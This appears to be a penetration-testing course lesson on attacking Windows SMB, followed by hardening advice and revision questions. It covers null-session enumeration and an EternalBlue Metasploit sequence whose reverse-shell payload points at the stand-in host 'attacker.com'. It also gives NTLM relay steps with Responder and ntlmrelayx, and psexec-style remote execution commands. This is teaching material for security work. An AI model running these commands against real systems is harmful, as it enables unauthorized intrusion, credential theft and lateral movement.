# SMB Attacks

## Unit 6 - Topic 1 | Network Protocol Attacks

---

## Overview

**SMB (Server Message Block)** is the primary file sharing protocol in Windows networks. Running on port 445 (and legacy 139), SMB is a prime target due to its prevalence, historical vulnerabilities, and role in Active Directory authentication.

---

## 1. SMB Protocol Versions

| Version | OS | Security |
|---------|:--:|----------|
| **SMBv1** | XP/2003 | ❌ Dangerous — EternalBlue |
| **SMBv2** | Vista/2008 | ⚠️ Better but still issues |
| **SMBv2.1** | Win7/2008R2 | ⚠️ Moderate |
| **SMBv3.0** | Win8/2012 | ✅ Encryption support |
| **SMBv3.1.1** | Win10/2016+ | ✅ Pre-auth integrity |

---

## 2. SMB Enumeration

```bash
# === NULL SESSION ENUMERATION ===
# Test anonymous access:
smbclient -L //target.com -N
# -L: List shares
# -N: No password (null session)

# Enum4linux (comprehensive):
enum4linux -a target.com
# -a: All enumeration (users, shares, groups, policies)

# CrackMapExec:
crackmapexec smb target.com -u '' -p '' --shares
crackmapexec smb target.com -u 'guest' -p '' --shares

# smbmap:
smbmap -H target.com
smbmap -H target.com -u '' -p ''
smbmap -H target.com -u 'guest' -p '' -R
# -R: Recursive listing

# RPCclient:
rpcclient -U "" -N target.com
rpcclient> enumdomusers    # List domain users
rpcclient> enumdomgroups   # List domain groups
rpcclient> querydominfo    # Domain information

# Nmap SMB scripts:
nmap -p 445 --script smb-enum-shares,smb-enum-users target.com
nmap -p 445 --script smb-os-discovery target.com
nmap -p 445 --script smb-vuln-* target.com
```

---

## 3. SMB Exploitation

```bash
# === ETERNALBLUE (MS17-010) — SMBv1 ===
# Check vulnerability:
nmap -p 445 --script smb-vuln-ms17-010 target.com

# Metasploit:
use exploit/windows/smb/ms17_010_eternalblue
set RHOSTS target.com
set PAYLOAD windows/x64/meterpreter/reverse_tcp
set LHOST attacker.com
exploit

# === SMB RELAY ATTACK ===
# Relay captured NTLMv2 hash to another host:
# 1. Disable SMB and HTTP in Responder:
# Edit /etc/responder/Responder.conf:
# SMB = Off
# HTTP = Off

# 2. Start ntlmrelayx:
ntlmrelayx.py -tf targets.txt -smb2support

# 3. Start Responder:
responder -I eth0 -wrfud

# When victim authenticates → hash relayed to targets
# Can dump SAM, execute commands, create shares

# === AUTHENTICATED ACCESS ===
# Connect to share:
smbclient //target.com/sharename -U 'domain\user%password'

# psexec (Remote execution via SMB):
impacket-psexec domain/admin:password@target.com
# Drops a service binary → gets SYSTEM shell

# wmiexec:
impacket-wmiexec domain/admin:password@target.com
# Uses WMI instead of creating service

# smbexec:
impacket-smbexec domain/admin:password@target.com
```

---

## 4. SMB Attack Techniques

```
SMB ATTACK TREE:

UNAUTHENTICATED:
├── Null session enumeration (users, shares, groups)
├── Guest access to shares
├── SMBv1 exploits (EternalBlue MS17-010)
├── SMB signing disabled → relay attacks
└── Brute force / password spraying

AUTHENTICATED:
├── Share access → sensitive file discovery
├── Remote code execution (psexec, wmiexec)
├── SAM/NTDS dump (secretsdump)
├── Hash dump → pass-the-hash
├── Service creation → persistence
└── Lateral movement to other hosts

KEY CHECKS:
├── Is SMBv1 enabled? → EternalBlue
├── Is SMB signing required? → If not, relay possible
├── Is null session allowed? → Enum without creds
├── Any writable shares? → Drop payloads
└── Service accounts on shares? → Passwords in configs
```

---

## 5. SMB Security Best Practices

| Defense | Implementation |
|---------|---------------|
| **Disable SMBv1** | `Set-SmbServerConfiguration -EnableSMB1Protocol $false` |
| **Require signing** | GPO: Microsoft Network Server → Digitally sign communications |
| **Disable null sessions** | Restrict anonymous access |
| **Firewall SMB** | Block 445 at perimeter |
| **Audit access** | Log share access events |
| **Least privilege** | Restrict share permissions |

---

## Summary Table

| Concept | Key Point |
|---------|-----------|
| **SMB** | Port 445 — Windows file sharing |
| **EternalBlue** | MS17-010 — SMBv1 remote code execution |
| **SMB Relay** | Forward captured auth to another host |
| **psexec** | Remote SYSTEM shell via SMB |
| **enum4linux** | Comprehensive SMB enumeration |
| **Defense** | Disable SMBv1, require signing |

---

## Quick Revision Questions

1. **What port does SMB primarily use?**
2. **What is EternalBlue and which SMB version does it target?**
3. **How do SMB relay attacks work?**
4. **What is a null session and why is it dangerous?**
5. **How does SMB signing prevent relay attacks?**

---

[Next: LDAP Enumeration →](02-ldap-enumeration.md)

---

*Unit 6 - Topic 1 of 6 | [Back to README](../README.md)*
